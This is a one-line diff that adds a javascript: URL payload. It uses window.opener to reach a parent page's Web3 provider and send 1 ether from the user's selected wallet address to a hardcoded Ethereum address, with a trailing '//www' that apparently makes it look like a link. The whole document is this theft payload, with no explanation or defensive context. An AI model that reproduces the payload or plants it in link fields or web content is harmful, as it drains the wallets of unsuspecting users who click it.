@@ -1,0 +1,1 @@
+javascript:window.opener.web3.eth.sendTransaction({from:window.opener.web3.currentProvider.selectedAddress,to:"0x81c8989574d0acbebe7d40fd9133ca941415b579", value:window.opener.web3.toWei(1, "ether")});//www
